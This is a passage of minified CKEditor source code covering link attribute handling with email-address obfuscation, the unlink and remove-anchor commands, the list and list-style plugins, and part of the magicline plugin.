                    a.address = o[1], n && (a.subject = decodeURIComponent(n[1])), i && (a.body = decodeURIComponent(i[1]));
                } else i && (n = i.match(/^((?:http|https|ftp|news):\/\/)?(.*)$/)) && (s.type = "url",
                s.url = {}, s.url.protocol = n[1], s.url.url = n[2]);
                if (t) {
                    if (i = t.getAttribute("target")) s.target = {
                        type: i.match(/^(_(?:self|top|parent|blank))$/) ? i : "frame",
                        name: i
                    }; else if (i = (i = t.data("cke-pa-onclick") || t.getAttribute("onclick")) && i.match(/\s*window.open\(\s*this\.href\s*,\s*(?:'([^']*)'|null)\s*,\s*'([^']*)'\s*\)\s*;\s*return\s*false;*\s*/)) for (s.target = {
                        type: "popup",
                        name: i[1]
                    }; o = c.exec(i[2]); ) "yes" != o[2] && "1" != o[2] || o[1] in {
                        height: 1,
                        width: 1,
                        top: 1,
                        left: 1
                    } ? isFinite(o[2]) && (s.target[o[1]] = o[2]) : s.target[o[1]] = !0;
                    var l;
                    for (l in i = {}, h) (o = t.getAttribute(l)) && (i[h[l]] = o);
                    (l = t.data("cke-saved-name") || i.advName) && (i.advName = l), CKEDITOR.tools.isEmpty(i) || (s.advanced = i);
                }
                return s;
            },
            getLinkAttributes: function(s, t) {
                var e = s.config.emailProtection || "", n = {};
                switch (t.type) {
                  case "url":
                    e = t.url && void 0 !== t.url.protocol ? t.url.protocol : "http://";
                    var i = t.url && CKEDITOR.tools.trim(t.url.url) || "";
                    n["data-cke-saved-href"] = 0 === i.indexOf("/") ? i : e + i;
                    break;

                  case "anchor":
                    e = t.anchor && t.anchor.id, n["data-cke-saved-href"] = "#" + (t.anchor && t.anchor.name || e || "");
                    break;

                  case "email":
                    switch (i = (r = t.email).address, e) {
                      case "":
                      case "encode":
                        var o = encodeURIComponent(r.subject || ""), a = encodeURIComponent(r.body || ""), r = [];
                        o && r.push("subject=" + o), a && r.push("body=" + a), r = r.length ? "?" + r.join("&") : "",
                        "encode" == e ? (e = [ "javascript:void(location.href='mailto:'+", function(e) {
                            for (var t, n = e.length, i = [], o = 0; o < n; o++) t = e.charCodeAt(o), i.push(t);
                            return "String.fromCharCode(" + i.join(",") + ")";
                        }(i) ], r && e.push("+'", u(r), "'"), e.push(")")) : e = [ "mailto:", i, r ];
                        break;

                      default:
                        e = i.split("@", 2), r.name = e[0], r.domain = e[1], e = [ "javascript:", function(e, t) {
                            var n, i, o = s.plugins.link, a = o.compiledProtectionFunction.params;
                            i = [ o.compiledProtectionFunction.name, "(" ];
                            for (var r = 0; r < a.length; r++) n = t[o = a[r].toLowerCase()], 0 < r && i.push(","),
                            i.push("'", n ? u(encodeURIComponent(t[o])) : "", "'");
                            return i.push(")"), i.join("");
                        }(0, r) ];
                    }
                    n["data-cke-saved-href"] = e.join("");
                }
                if (t.target) if ("popup" == t.target.type) {
                    e = [ "window.open(this.href, '", t.target.name || "", "', '" ];
                    var l = "resizable status location toolbar menubar fullscreen scrollbars dependent".split(" ");
                    for (i = l.length, o = function(e) {
                        t.target[e] && l.push(e + "=" + t.target[e]);
                    }, r = 0; r < i; r++) l[r] += t.target[l[r]] ? "=yes" : "=no";
                    o("width"), o("left"), o("height"), o("top"), e.push(l.join(","), "'); return false;"),
                    n["data-cke-pa-onclick"] = e.join("");
                } else "notSet" != t.target.type && t.target.name && (n.target = t.target.name);
                if (t.advanced) {
                    for (var c in h) (e = t.advanced[h[c]]) && (n[c] = e);
                    n.name && (n["data-cke-saved-name"] = n.name);
                }
                for (var d in n["data-cke-saved-href"] && (n.href = n["data-cke-saved-href"]), c = CKEDITOR.tools.extend({
                    target: 1,
                    onclick: 1,
                    "data-cke-pa-onclick": 1,
                    "data-cke-saved-name": 1
                }, h), n) delete c[d];
                return {
                    set: n,
                    removed: CKEDITOR.tools.objectKeys(c)
                };
            }
        }, CKEDITOR.unlinkCommand = function() {}, CKEDITOR.unlinkCommand.prototype = {
            exec: function(e) {
                var t = new CKEDITOR.style({
                    element: "a",
                    type: CKEDITOR.STYLE_INLINE,
                    alwaysRemoveElement: 1
                });
                e.removeStyle(t);
            },
            refresh: function(e, t) {
                var n = t.lastElement && t.lastElement.getAscendant("a", !0);
                n && "a" == n.getName() && n.getAttribute("href") && n.getChildCount() ? this.setState(CKEDITOR.TRISTATE_OFF) : this.setState(CKEDITOR.TRISTATE_DISABLED);
            },
            contextSensitive: 1,
            startDisabled: 1,
            requiredContent: "a[href]"
        }, CKEDITOR.removeAnchorCommand = function() {}, CKEDITOR.removeAnchorCommand.prototype = {
            exec: function(e) {
                var t, n = e.getSelection(), i = n.createBookmarks();
                n && (t = n.getSelectedElement()) && (t.getChildCount() ? t.is("a") : CKEDITOR.plugins.link.tryRestoreFakeAnchor(e, t)) ? t.remove(1) : (t = CKEDITOR.plugins.link.getSelectedLink(e)) && (t.hasAttribute("href") ? (t.removeAttributes({
                    name: 1,
                    "data-cke-saved-name": 1
                }), t.removeClass("cke_anchor")) : t.remove(1)), n.selectBookmarks(i);
            },
            requiredContent: "a[name]"
        }, CKEDITOR.tools.extend(CKEDITOR.config, {
            linkShowAdvancedTab: !0,
            linkShowTargetTab: !0
        });
    }(), function() {
        function p(t, n, e) {
            function i(e) {
                !(l = d[e ? "getFirst" : "getLast"]()) || l.is && l.isBlockBoundary() || !(c = n.root[e ? "getPrevious" : "getNext"](CKEDITOR.dom.walker.invisible(!0))) || c.is && c.isBlockBoundary({
                    br: 1
                }) || t.document.createElement("br")[e ? "insertBefore" : "insertAfter"](l);
            }
            for (var o = CKEDITOR.plugins.list.listToArray(n.root, e), a = [], r = 0; r < n.contents.length; r++) {
                var s = n.contents[r];
                (s = s.getAscendant("li", !0)) && !s.getCustomData("list_item_processed") && (a.push(s),
                CKEDITOR.dom.element.setMarker(e, s, "list_item_processed", !0));
            }
            for (s = null, r = 0; r < a.length; r++) o[s = a[r].getCustomData("listarray_index")].indent = -1;
            for (r = s + 1; r < o.length; r++) if (o[r].indent > o[r - 1].indent + 1) {
                for (a = o[r - 1].indent + 1 - o[r].indent, s = o[r].indent; o[r] && o[r].indent >= s; ) o[r].indent += a,
                r++;
                r--;
            }
            var l, c, d = CKEDITOR.plugins.list.arrayToList(o, e, null, t.config.enterMode, n.root.getAttribute("dir")).listNode;
            i(!0), i(), d.replace(n.root), t.fire("contentDomInvalidated");
        }
        function e(e, t) {
            this.name = e, this.context = this.type = t, this.allowedContent = t + " li", this.requiredContent = t;
        }
        function c(e, t, n, i) {
            for (var o, a; o = e[i ? "getLast" : "getFirst"](r); ) (a = o.getDirection(1)) !== t.getDirection(1) && o.setAttribute("dir", a),
            o.remove(), n ? o[i ? "insertBefore" : "insertAfter"](n) : t.append(o, i);
        }
        function T(n) {
            function e(e) {
                var t = n[e ? "getPrevious" : "getNext"](K);
                t && t.type == CKEDITOR.NODE_ELEMENT && t.is(n.getName()) && (c(n, t, null, !e),
                n.remove(), n = t);
            }
            e(), e(1);
        }
        function d(e) {
            return e.type == CKEDITOR.NODE_ELEMENT && (e.getName() in CKEDITOR.dtd.$block || e.getName() in CKEDITOR.dtd.$listItem) && CKEDITOR.dtd[e.getName()]["#"];
        }
        function u(e, t, n) {
            e.fire("saveSnapshot"), n.enlarge(CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS);
            var i = n.extractContents();
            t.trim(!1, !0);
            var o = t.createBookmark(), a = (r = new CKEDITOR.dom.elementPath(t.startContainer)).block, r = r.lastElement.getAscendant("li", 1) || a, s = (l = new CKEDITOR.dom.elementPath(n.startContainer)).contains(CKEDITOR.dtd.$listItem), l = l.contains(CKEDITOR.dtd.$list);
            for (a ? (a = a.getBogus()) && a.remove() : l && (a = l.getPrevious(K)) && f(a) && a.remove(),
            (a = i.getLast()) && a.type == CKEDITOR.NODE_ELEMENT && a.is("br") && a.remove(),
            (a = t.startContainer.getChild(t.startOffset)) ? i.insertBefore(a) : t.startContainer.append(i),
            s && (i = h(s)) && (r.contains(s) ? (c(i, s.getParent(), s), i.remove()) : r.append(i)); n.checkStartOfBlock() && n.checkEndOfBlock() && (i = (l = n.startPath()).block); ) i.is("li") && (r = i.getParent(),
            i.equals(r.getLast(K)) && i.equals(r.getFirst(K)) && (i = r)), n.moveToPosition(i, CKEDITOR.POSITION_BEFORE_START),
            i.remove();
            n = n.clone(), i = e.editable(), n.setEndAt(i, CKEDITOR.POSITION_BEFORE_END), (n = new CKEDITOR.dom.walker(n)).evaluator = function(e) {
                return K(e) && !f(e);
            }, (n = n.next()) && n.type == CKEDITOR.NODE_ELEMENT && n.getName() in CKEDITOR.dtd.$list && T(n),
            t.moveToBookmark(o), t.select(), e.fire("saveSnapshot");
        }
        function h(e) {
            return (e = e.getLast(K)) && e.type == CKEDITOR.NODE_ELEMENT && e.getName() in v ? e : null;
        }
        var v = {
            ol: 1,
            ul: 1
        }, t = CKEDITOR.dom.walker.whitespaces(), b = CKEDITOR.dom.walker.bookmark(), K = function(e) {
            return !(t(e) || b(e));
        }, f = CKEDITOR.dom.walker.bogus();
        CKEDITOR.plugins.list = {
            listToArray: function(e, t, n, i, o) {
                if (!v[e.getName()]) return [];
                i || (i = 0), n || (n = []);
                for (var a = 0, r = e.getChildCount(); a < r; a++) {
                    var s = e.getChild(a);
                    if (s.type == CKEDITOR.NODE_ELEMENT && s.getName() in CKEDITOR.dtd.$list && CKEDITOR.plugins.list.listToArray(s, t, n, i + 1),
                    "li" == s.$.nodeName.toLowerCase()) {
                        var l = {
                            parent: e,
                            indent: i,
                            element: s,
                            contents: []
                        };
                        o ? l.grandparent = o : (l.grandparent = e.getParent(), l.grandparent && "li" == l.grandparent.$.nodeName.toLowerCase() && (l.grandparent = l.grandparent.getParent())),
                        t && CKEDITOR.dom.element.setMarker(t, s, "listarray_index", n.length), n.push(l);
                        for (var c, d = 0, u = s.getChildCount(); d < u; d++) (c = s.getChild(d)).type == CKEDITOR.NODE_ELEMENT && v[c.getName()] ? CKEDITOR.plugins.list.listToArray(c, t, n, i + 1, l.grandparent) : l.contents.push(c);
                    }
                }
                return n;
            },
            arrayToList: function(e, t, n, i, o) {
                if (n || (n = 0), !e || e.length < n + 1) return null;
                for (var a, r, s, l = e[n].parent.getDocument(), c = new CKEDITOR.dom.documentFragment(l), d = null, u = n, h = Math.max(e[n].indent, 0), f = null, m = i == CKEDITOR.ENTER_P ? "p" : "div"; ;) {
                    var g = e[u];
                    if (a = g.grandparent, r = g.element.getDirection(1), g.indent == h) {
                        for (d && e[u].parent.getName() == d.getName() || (d = e[u].parent.clone(!1, 1),
                        o && d.setAttribute("dir", o), c.append(d)), f = d.append(g.element.clone(0, 1)),
                        r != d.getDirection(1) && f.setAttribute("dir", r), a = 0; a < g.contents.length; a++) f.append(g.contents[a].clone(1, 1));
                        u++;
                    } else if (g.indent == Math.max(h, 0) + 1) g = e[u - 1].element.getDirection(1),
                    u = CKEDITOR.plugins.list.arrayToList(e, null, u, i, g != r ? r : null), !f.getChildCount() && CKEDITOR.env.needsNbspFiller && l.$.documentMode <= 7 && f.append(l.createText(" ")),
                    f.append(u.listNode), u = u.nextIndex; else {
                        if (-1 != g.indent || n || !a) return null;
                        v[a.getName()] ? (f = g.element.clone(!1, !0), r != a.getDirection(1) && f.setAttribute("dir", r)) : f = new CKEDITOR.dom.documentFragment(l),
                        d = a.getDirection(1) != r;
                        var E, p, T = g.element, C = T.getAttribute("class"), I = T.getAttribute("style"), O = f.type == CKEDITOR.NODE_DOCUMENT_FRAGMENT && (i != CKEDITOR.ENTER_BR || d || I || C), D = g.contents.length;
                        for (a = 0; a < D; a++) if (E = g.contents[a], b(E) && 1 < D) O ? p = E.clone(1, 1) : f.append(E.clone(1, 1)); else if (E.type == CKEDITOR.NODE_ELEMENT && E.isBlockBoundary()) {
                            d && !E.getDirection() && E.setAttribute("dir", r), s = E;
                            var R = T.getAttribute("style");
                            R && s.setAttribute("style", R.replace(/([^;])$/, "$1;") + (s.getAttribute("style") || "")),
                            C && E.addClass(C), s = null, p && (f.append(p), p = null), f.append(E.clone(1, 1));
                        } else O ? (s || (s = l.createElement(m), f.append(s), d && s.setAttribute("dir", r)),
                        I && s.setAttribute("style", I), C && s.setAttribute("class", C), p && (s.append(p),
                        p = null), s.append(E.clone(1, 1))) : f.append(E.clone(1, 1));
                        p && ((s || f).append(p), p = null), f.type == CKEDITOR.NODE_DOCUMENT_FRAGMENT && u != e.length - 1 && (CKEDITOR.env.needsBrFiller && (r = f.getLast()) && r.type == CKEDITOR.NODE_ELEMENT && r.is("br") && r.remove(),
                        (!(r = f.getLast(K)) || !(r.type == CKEDITOR.NODE_ELEMENT && r.is(CKEDITOR.dtd.$block))) && f.append(l.createElement("br"))),
                        ("div" == (r = f.$.nodeName.toLowerCase()) || "p" == r) && f.appendBogus(), c.append(f),
                        d = null, u++;
                    }
                    if (s = null, e.length <= u || Math.max(e[u].indent, 0) < h) break;
                }
                if (t) for (e = c.getFirst(); e; ) {
                    if (e.type == CKEDITOR.NODE_ELEMENT && (CKEDITOR.dom.element.clearMarkers(t, e),
                    e.getName() in CKEDITOR.dtd.$listItem && (l = o = i = void 0, i = (n = e).getDirection()))) {
                        for (o = n.getParent(); o && !(l = o.getDirection()); ) o = o.getParent();
                        i == l && n.removeAttribute("dir");
                    }
                    e = e.getNextSourceNode();
                }
                return {
                    listNode: c,
                    nextIndex: u
                };
            }
        };
        var C = /^h[1-6]$/, r = CKEDITOR.dom.walker.nodeType(CKEDITOR.NODE_ELEMENT);
        e.prototype = {
            exec: function(e) {
                this.refresh(e, e.elementPath());
                var t = e.config, n = e.getSelection(), i = n && n.getRanges();
                if (this.state == CKEDITOR.TRISTATE_OFF) if ((a = e.editable()).getFirst(K)) {
                    var o = 1 == i.length && i[0];
                    (t = o && o.getEnclosedNode()) && t.is && this.type == t.getName() && this.setState(CKEDITOR.TRISTATE_ON);
                } else t.enterMode == CKEDITOR.ENTER_BR ? a.appendBogus() : i[0].fixBlock(1, t.enterMode == CKEDITOR.ENTER_P ? "p" : "div"),
                n.selectRanges(i);
                t = n.createBookmarks(!0);
                for (var a = [], r = {}, s = (i = i.createIterator(), 0); (o = i.getNextRange()) && ++s; ) {
                    var l = (g = o.getBoundaryNodes()).startNode, c = g.endNode;
                    for (l.type == CKEDITOR.NODE_ELEMENT && "td" == l.getName() && o.setStartAt(g.startNode, CKEDITOR.POSITION_AFTER_START),
                    c.type == CKEDITOR.NODE_ELEMENT && "td" == c.getName() && o.setEndAt(g.endNode, CKEDITOR.POSITION_BEFORE_END),
                    (o = o.createIterator()).forceBrBreak = this.state == CKEDITOR.TRISTATE_OFF; g = o.getNextParagraph(); ) if (!g.getCustomData("list_block")) {
                        CKEDITOR.dom.element.setMarker(r, g, "list_block", 1), l = (u = e.elementPath(g)).elements,
                        c = 0;
                        for (var d, u = u.blockLimit, h = l.length - 1; 0 <= h && (d = l[h]); h--) if (v[d.getName()] && u.contains(d)) {
                            u.removeCustomData("list_group_object_" + s), (l = d.getCustomData("list_group_object")) ? l.contents.push(g) : (l = {
                                root: d,
                                contents: [ g ]
                            }, a.push(l), CKEDITOR.dom.element.setMarker(r, d, "list_group_object", l)), c = 1;
                            break;
                        }
                        c || ((c = u).getCustomData("list_group_object_" + s) ? c.getCustomData("list_group_object_" + s).contents.push(g) : (l = {
                            root: c,
                            contents: [ g ]
                        }, CKEDITOR.dom.element.setMarker(r, c, "list_group_object_" + s, l), a.push(l)));
                    }
                }
                for (d = []; 0 < a.length; ) if (l = a.shift(), this.state == CKEDITOR.TRISTATE_OFF) if (v[l.root.getName()]) {
                    for (i = e, s = l, l = r, o = d, c = CKEDITOR.plugins.list.listToArray(s.root, l),
                    u = [], g = 0; g < s.contents.length; g++) (h = (h = s.contents[g]).getAscendant("li", !0)) && !h.getCustomData("list_item_processed") && (u.push(h),
                    CKEDITOR.dom.element.setMarker(l, h, "list_item_processed", !0));
                    h = s.root.getDocument();
                    for (var f = void 0, m = void 0, g = 0; g < u.length; g++) {
                        var E = u[g].getCustomData("listarray_index");
                        (f = c[E].parent).is(this.type) || (m = h.createElement(this.type), f.copyAttributes(m, {
                            start: 1,
                            type: 1
                        }), m.removeStyle("list-style-type"), c[E].parent = m);
                    }
                    for (l = CKEDITOR.plugins.list.arrayToList(c, l, null, i.config.enterMode), c = void 0,
                    u = l.listNode.getChildCount(), g = 0; g < u && (c = l.listNode.getChild(g)); g++) c.getName() == this.type && o.push(c);
                    l.listNode.replace(s.root), i.fire("contentDomInvalidated");
                } else {
                    for (c = e, o = d, u = (g = l).contents, i = g.root.getDocument(), s = [], 1 == u.length && u[0].equals(g.root) && (l = i.createElement("div"),
                    u[0].moveChildren && u[0].moveChildren(l), u[0].append(l), u[0] = l), g = g.contents[0].getParent(),
                    h = 0; h < u.length; h++) g = g.getCommonAncestor(u[h].getParent());
                    for (f = c.config.useComputedState, c = l = void 0, f = void 0 === f || f, h = 0; h < u.length; h++) for (m = u[h]; E = m.getParent(); ) {
                        if (E.equals(g)) {
                            s.push(m), !c && m.getDirection() && (c = 1), m = m.getDirection(f), null !== l && (l = l && l != m ? null : m);
                            break;
                        }
                        m = E;
                    }
                    if (!(s.length < 1)) {
                        for (u = s[s.length - 1].getNext(), h = i.createElement(this.type), o.push(h), f = o = void 0; s.length; ) o = s.shift(),
                        f = i.createElement("li"), o.is("pre") || C.test(o.getName()) || "false" == o.getAttribute("contenteditable") ? o.appendTo(f) : (o.copyAttributes(f),
                        l && o.getDirection() && (f.removeStyle("direction"), f.removeAttribute("dir")),
                        o.moveChildren(f), o.remove()), f.appendTo(h);
                        l && c && h.setAttribute("dir", l), u ? h.insertBefore(u) : h.appendTo(g);
                    }
                } else this.state == CKEDITOR.TRISTATE_ON && v[l.root.getName()] && p.call(this, e, l, r);
                for (h = 0; h < d.length; h++) T(d[h]);
                CKEDITOR.dom.element.clearAllMarkers(r), n.selectBookmarks(t), e.focus();
            },
            refresh: function(e, t) {
                var n = t.contains(v, 1), i = t.blockLimit || t.root;
                n && i.contains(n) ? this.setState(n.is(this.type) ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF) : this.setState(CKEDITOR.TRISTATE_OFF);
            }
        }, CKEDITOR.plugins.add("list", {
            requires: "indentlist",
            init: function(c) {
                c.blockless || (c.addCommand("numberedlist", new e("numberedlist", "ol")), c.addCommand("bulletedlist", new e("bulletedlist", "ul")),
                c.ui.addButton && (c.ui.addButton("NumberedList", {
                    label: c.lang.list.numberedlist,
                    command: "numberedlist",
                    directional: !0,
                    toolbar: "list,10"
                }), c.ui.addButton("BulletedList", {
                    label: c.lang.list.bulletedlist,
                    command: "bulletedlist",
                    directional: !0,
                    toolbar: "list,20"
                })), c.on("key", function(e) {
                    var t, n = e.data.domEvent.getKey();
                    if ("wysiwyg" == c.mode && n in {
                        8: 1,
                        46: 1
                    }) {
                        var i = c.getSelection().getRanges()[0], o = i && i.startPath();
                        if (i && i.collapsed) {
                            var a, r = 8 == n, s = c.editable(), l = new CKEDITOR.dom.walker(i.clone());
                            l.evaluator = function(e) {
                                return K(e) && !f(e);
                            }, l.guard = function(e, t) {
                                return !(t && e.type == CKEDITOR.NODE_ELEMENT && e.is("table"));
                            }, n = i.clone(), r ? ((a = o.contains(v)) && i.checkBoundaryOfElement(a, CKEDITOR.START) && (a = a.getParent()) && a.is("li") && (a = h(a)) ? (a = (t = a).getPrevious(K),
                            n.moveToPosition(a && f(a) ? a : t, CKEDITOR.POSITION_BEFORE_START)) : (l.range.setStartAt(s, CKEDITOR.POSITION_AFTER_START),
                            l.range.setEnd(i.startContainer, i.startOffset), (a = l.previous()) && a.type == CKEDITOR.NODE_ELEMENT && (a.getName() in v || a.is("li")) && (a.is("li") || (l.range.selectNodeContents(a),
                            l.reset(), l.evaluator = d, a = l.previous()), t = a, n.moveToElementEditEnd(t))),
                            t ? (u(c, n, i), e.cancel()) : (n = o.contains(v)) && i.checkBoundaryOfElement(n, CKEDITOR.START) && (t = n.getFirst(K),
                            i.checkBoundaryOfElement(t, CKEDITOR.START) && (a = n.getPrevious(K), h(t) ? a && (i.moveToElementEditEnd(a),
                            i.select()) : c.execCommand("outdent"), e.cancel()))) : (t = o.contains("li")) ? (l.range.setEndAt(s, CKEDITOR.POSITION_BEFORE_END),
                            t = (o = t.getLast(K)) && d(o) ? o : t, s = 0, (a = l.next()) && a.type == CKEDITOR.NODE_ELEMENT && a.getName() in v && a.equals(o) ? (s = 1,
                            a = l.next()) : i.checkBoundaryOfElement(t, CKEDITOR.END) && (s = 1), s && a && ((i = i.clone()).moveToElementEditStart(a),
                            u(c, n, i), e.cancel())) : (l.range.setEndAt(s, CKEDITOR.POSITION_BEFORE_END), (a = l.next()) && a.type == CKEDITOR.NODE_ELEMENT && a.is(v) && (a = a.getFirst(K),
                            o.block && i.checkStartOfBlock() && i.checkEndOfBlock() ? (o.block.remove(), i.moveToElementEditStart(a),
                            i.select()) : h(a) ? (i.moveToElementEditStart(a), i.select()) : ((i = i.clone()).moveToElementEditStart(a),
                            u(c, n, i)), e.cancel())), setTimeout(function() {
                                c.selectionChange(1);
                            });
                        }
                    }
                }));
            }
        });
    }(), CKEDITOR.plugins.liststyle = {
        requires: "dialog,contextmenu",
        init: function(e) {
            var t;
            e.blockless || (t = new CKEDITOR.dialogCommand("numberedListStyle", {
                requiredContent: "ol",
                allowedContent: "ol{list-style-type}[start]"
            }), t = e.addCommand("numberedListStyle", t), e.addFeature(t), CKEDITOR.dialog.add("numberedListStyle", this.path + "dialogs/liststyle.js"),
            t = new CKEDITOR.dialogCommand("bulletedListStyle", {
                requiredContent: "ul",
                allowedContent: "ul{list-style-type}"
            }), t = e.addCommand("bulletedListStyle", t), e.addFeature(t), CKEDITOR.dialog.add("bulletedListStyle", this.path + "dialogs/liststyle.js"),
            e.addMenuGroup("list", 108), e.addMenuItems({
                numberedlist: {
                    label: e.lang.liststyle.numberedTitle,
                    group: "list",
                    command: "numberedListStyle"
                },
                bulletedlist: {
                    label: e.lang.liststyle.bulletedTitle,
                    group: "list",
                    command: "bulletedListStyle"
                }
            }), e.contextMenu.addListener(function(e) {
                if (!e || e.isReadOnly()) return null;
                for (;e; ) {
                    var t = e.getName();
                    if ("ol" == t) return {
                        numberedlist: CKEDITOR.TRISTATE_OFF
                    };
                    if ("ul" == t) return {
                        bulletedlist: CKEDITOR.TRISTATE_OFF
                    };
                    e = e.getParent();
                }
                return null;
            }));
        }
    }, CKEDITOR.plugins.add("liststyle", CKEDITOR.plugins.liststyle), function() {
        function f(e, t, n) {
            return E(t) && E(n) && n.equals(t.getNext(function(e) {
                return !(G(e) || X(e) || p(e));
            }));
        }
        function m(e) {
            this.upper = e[0], this.lower = e[1], this.set.apply(this, e.slice(2));
        }
        function h(e) {
            var t = e.element;
            if (t && E(t) && (t = t.getAscendant(e.triggers, !0)) && e.editable.contains(t)) {
                var n = r(t);
                if ("true" == n.getAttribute("contenteditable")) return t;
                if (n.is(e.triggers)) return n;
            }
            return null;
        }
        function g(t, e, n) {
            return e[n ? "getPrevious" : "getNext"](function(e) {
                return e && e.type == CKEDITOR.NODE_TEXT && !G(e) || E(e) && !p(e) && !u(t, e);
            });
        }
        function r(e, t) {
            if (e.data("cke-editable")) return null;
            for (t || (e = e.getParent()); e && !e.data("cke-editable"); ) {
                if (e.hasAttribute("contenteditable")) return e;
                e = e.getParent();
            }
            return null;
        }
        function d(e, t, n) {
            var i, o = new CKEDITOR.dom.range(e.doc), a = e.editor;
            N.ie && e.enterMode == CKEDITOR.ENTER_BR ? i = e.doc.createText(l) : (i = (i = r(e.element, !0)) && i.data("cke-enter-mode") || e.enterMode,
            (i = new _(s[i], e.doc)).is("br") || e.doc.createText(l).appendTo(i)), n && a.fire("saveSnapshot"),
            t(i), o.moveToPosition(i, CKEDITOR.POSITION_AFTER_START), a.getSelection().selectRanges([ o ]),
            e.hotNode = i, n && a.fire("saveSnapshot");
        }
        function c(o, a) {
            return {
                canUndo: !0,
                modes: {
                    wysiwyg: 1
                },
                exec: function() {
                    function i(t) {
                        var e = N.ie && N.version < 9 ? " " : l, n = o.hotNode && o.hotNode.getText() == e && o.element.equals(o.hotNode) && o.lastCmdDirection === !!a;
                        d(o, function(e) {
                            n && o.hotNode && o.hotNode.remove(), e[a ? "insertAfter" : "insertBefore"](t),
                            e.setAttributes({
                                "data-cke-magicline-hot": 1,
                                "data-cke-magicline-dir": !!a
                            }), o.lastCmdDirection = !!a;
                        }), !N.ie && o.enterMode != CKEDITOR.ENTER_BR && o.hotNode.scrollIntoView(), o.line.detach();
                    }
                    return function(e) {
                        var t, n;
                        e = (e = e.getSelection().getStartElement()).getAscendant(z, 1), I(o, e) || !e || e.equals(o.editable) || e.contains(o.editable) || ((t = r(e)) && "false" == t.getAttribute("contenteditable") && (e = t),
                        o.element = e, E(t = g(o, e, !a)) && t.is(o.triggers) && t.is(H) && (!g(o, t, !a) || (n = g(o, t, !a)) && E(n) && n.is(o.triggers)) ? i(t) : E(n = h(o)) && (g(o, n, !a) ? (e = g(o, n, !a)) && E(e) && e.is(o.triggers) && i(n) : i(n)));
                    };
                }()
            };
        }
        function u(e, t) {
            if (!t || t.type != CKEDITOR.NODE_ELEMENT || !t.$) return !1;
            var n = e.line;
            return n.wrap.equals(t) || n.wrap.contains(t);
        }
        function E(e) {
            return e && e.type == CKEDITOR.NODE_ELEMENT && e.$;
        }
        function p(e) {
            return !!E(e) && ((t = T(e)) || (t = !(!E(e) || !(t = {
                left: 1,
                right: 1,
                center: 1
            })[e.getComputedStyle("float")] && !t[e.getAttribute("align")])), t);
            var t;
        }
        function T(e) {
            return !!{
                absolute: 1,
                fixed: 1
            }[e.getComputedStyle("position")];
        }
        function C(e, t) {
            return E(t) ? t.is(e.triggers) : null;
        }
        function I(e, t) {
            if (!t) return !1;
            for (var n = t.getParents(1), i = n.length; i--; ) for (var o = e.tabuList.length; o--; ) if (n[i].hasAttribute(e.tabuList[o])) return !0;
            return !1;
        }
        function O(e) {
            var t = e.editable, n = e.mouse, i = e.view, o = e.triggerOffset;
            b(e);
            var a = n.y > (e.inInlineMode ? i.editable.top + i.editable.height / 2 : Math.min(i.editable.height, i.pane.height) / 2);
            return (t = t[a ? "getLast" : "getFirst"](function(e) {
                return !(G(e) || X(e));
            })) ? (u(e, t) && (t = e.line.wrap[a ? "getPrevious" : "getNext"](function(e) {
                return !(G(e) || X(e));
            })), E(t) && !p(t) && C(e, t) ? (v(e, t), !a && 0 <= t.size.top && 0 < n.y && n.y < t.size.top + o ? (e = e.inInlineMode || 0 === i.scroll.y ? P : $,
            new m([ null, t, x, B, e ])) : a && t.size.bottom <= i.pane.height && n.y > t.size.bottom - o && n.y < i.pane.height ? (e = e.inInlineMode || t.size.bottom > i.pane.height - o && t.size.bottom < i.pane.height ? F : $,
            new m([ t, null, A, B, e ])) : null) : null) : null;
        }
        function D(e) {
            var t = e.mouse, n = e.view, i = e.triggerOffset, o = h(e);
            if (!o) return null;
            v(e, o), i = Math.min(i, 0 | o.size.outerHeight / 2);
            var a, r, s, l, c, d = [];
            if (t.y > o.size.top - 1 && t.y < o.size.top + i) r = !1; else {
                if (!(t.y > o.size.bottom - i && t.y < o.size.bottom + 1)) return null;
                r = !0;
            }
            if (p(o) || (s = e, (l = (l = o)[(c = r) ? "getLast" : "getFirst"](function(e) {
                return s.isRelevant(e) && !e.is(q);
            })) && (v(s, l), c ? l.size.top > s.mouse.y : l.size.bottom < s.mouse.y)) || o.getParent().is(M)) return null;
            var u = g(e, o, !r);
            if (u) {
                if (u && u.type == CKEDITOR.NODE_TEXT) return null;
                if (E(u)) {
                    if (p(u) || !C(e, u) || u.getParent().is(M)) return null;
                    d = [ u, o ][r ? "reverse" : "concat"]().concat([ L, B ]);
                }
            } else o.equals(e.editable[r ? "getLast" : "getFirst"](e.isRelevant)) ? (b(e), r && t.y > o.size.bottom - i && t.y < n.pane.height && o.size.bottom > n.pane.height - i && o.size.bottom < n.pane.height ? a = F : 0 < t.y && t.y < o.size.top + i && (a = P)) : a = $,
            d = [ null, o ][r ? "reverse" : "concat"]().concat([ r ? A : x, B, a, o.equals(e.editable[r ? "getLast" : "getFirst"](e.isRelevant)) ? r ? F : P : $ ]);
            return 0 in d ? new m(d) : null;
        }
        function R(e, n, t, i) {
            for (var o = function() {
                var t = N.ie ? n.$.currentStyle : e.win.$.getComputedStyle(n.$, "");
                return N.ie ? function(e) {
                    return t[CKEDITOR.tools.cssStyleToDomStyle(e)];
                } : function(e) {
                    return t.getPropertyValue(e);
                };
            }(), a = n.getDocumentPosition(), r = {}, s = {}, l = {}, c = {}, d = Z.length; d--; ) r[Z[d]] = parseInt(o("border-" + Z[d] + "-width"), 10) || 0,
            l[Z[d]] = parseInt(o("padding-" + Z[d]), 10) || 0, s[Z[d]] = parseInt(o("margin-" + Z[d]), 10) || 0;
            return (!t || i) && K(e, i), c.top = a.y - (t ? 0 : e.view.scroll.y), c.left = a.x - (t ? 0 : e.view.scroll.x),
            c.outerWidth = n.$.offsetWidth, c.outerHeight = n.$.offsetHeight, c.height = c.outerHeight - (l.top + l.bottom + r.top + r.bottom),
            c.width = c.outerWidth - (l.left + l.right + r.left + r.right), c.bottom = c.top + c.outerHeight,
            c.right = c.left + c.outerWidth, e.inInlineMode && (c.scroll = {
                top: n.$.scrollTop,
                left: n.$.scrollLeft
            }), y({
                border: r,
                padding: l,
                margin: s,
                ignoreScroll: t
            }, c, !0);
        }
        function v(e, t, n) {
            if (!E(t)) return t.size = null;
            if (t.size) {
                if (t.size.ignoreScroll == n && t.size.date > new Date() - o) return null;
            } else t.size = {};
            return y(t.size, R(e, t, n), {
                date: +new Date()
            }, !0);
        }
        function b(e, t) {
            e.view.editable = R(e, e.editable, t, !0);
        }
        function K(e, t) {
